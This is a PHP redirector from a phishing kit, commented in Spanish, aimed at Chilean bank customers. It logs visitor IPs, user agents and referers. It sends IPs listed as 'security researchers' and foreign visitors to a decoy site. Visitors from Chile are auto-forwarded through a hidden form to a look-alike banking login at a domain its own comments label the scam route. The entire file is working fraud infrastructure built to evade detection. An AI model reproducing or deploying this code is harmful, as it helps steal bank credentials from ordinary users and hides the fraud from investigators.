<?php
/*****************************************************************************/
error_reporting(0);
/*****************************************************************************/
date_default_timezone_set("America/Lima");
/*****************************************************************************/
function contador() {
   $archivo = "load/open.txt";
   $f = fopen($archivo, "r");
   if($f) {
            $contador = fread($f, filesize($archivo));
            $contador = $contador + 1;
            fclose($f); }
			
   $f = fopen($archivo, "w+");
        if($f) {
        fwrite($f, $contador);
        fclose($f); }
        return $contador; }
contador();
/*****************************************************************************
** Configuracion
******************************************************************************/
$src = array("RestaurarUsuario", "CuentaRestaurar", "UsuarioRestaurar", "RestaurarCuenta", "ValidarUsuario"); // Carpetas Aleatorias
$voy = "https://bancsstados.com/logins/"; // Redireccionador ruta Scam
$aut = "Chile"; // Pais Local
$vis = "Chile"; // Pais Visitante
$ms1 = "cgiRestaurar"; // Mensaje 1
$ms2 = "valueValidar"; // Mensaje 2
$bot = "https://www.wong.pe/"; // Bot de Bing, Facebook, Google, etc
/*****************************************************************************
** Desde aqui hasta el final no tocar nada
******************************************************************************/
$ip = $_SERVER["REMOTE_ADDR"];
$ref = (empty($_SERVER["HTTP_REFERER"])) ? "NOTREF" : $_SERVER["HTTP_REFERER"];
$ua = (empty($_SERVER["HTTP_USER_AGENT"])) ? "NOTUA" : $_SERVER["HTTP_USER_AGENT"];
$host = gethostbyaddr($ip);
/*****************************************************************************
** IP Baneadas de Security Researcher
******************************************************************************/
$ipArray = file("load/Bad.txt");
	foreach ($ipArray as $ipTest) {
		if (substr_count($ip,trim($ipTest)) != "0") {
		echo '<meta http-equiv="refresh" content="0;url='.$bot.'">';
	die(); }}
/*****************************************************************************
** Funcion Carpeta Aleatoria Hosting SCAM
******************************************************************************/
function nomb_ale($src) { 

	$randon = array_rand($src);
	$mycarp = $src[$randon]; 
	return $mycarp; }

$ruta = nomb_ale($src);
/*****************************************************************************/
$rand = md5(rand(111,999));
/*****************************************************************************/
include("geo.php");
$pais = getCountryFromIP($ip, " NamE ");
/*****************************************************************************/
$log = "load/IPLog.txt";
$control = fopen($log,"a+") or die("Imposible abrir el archivo\n");
$meses = array("Enero", "Febrero", "Marzo", "Abril", "Mayo", "Junio", "Julio", "Agosto", "Septiembre", "Octubre", "Noviembre", "Diciembre");
$dia = date("d");
$mes = date("m") - 1;
$hora = date("H:i:s");
fwrite($control, "IP: ".$ip." Fecha --> ".$dia." de ".$meses[$mes]." a las ".$hora." --> [".$pais."]\r\n"."User Agent: ".$ua."\r\n"."Host: ".$host."\r\n"."Referer: ".$ref."\r\n\n");
fclose($control);
/*****************************************************************************/
if ($pais == $aut || $pais == $vis) {
/*****************************************************************************/
echo'<form id="form" action="'.$voy.'?cid='.$ruta.'&cat='.$ms1.'&gClic='.$rand.'&'.$ms2.'" method="post">
<input type="hidden" name="cgi" value="Web"></form><script>document.forms["form"].submit()</script>'; }
else { @file_put_contents("load/BadPais.txt","IP: $ip\r\nPais: $pais\r\n\n",FILE_APPEND);
header("Location: ".$bot); }
/*****************************************************************************/
?>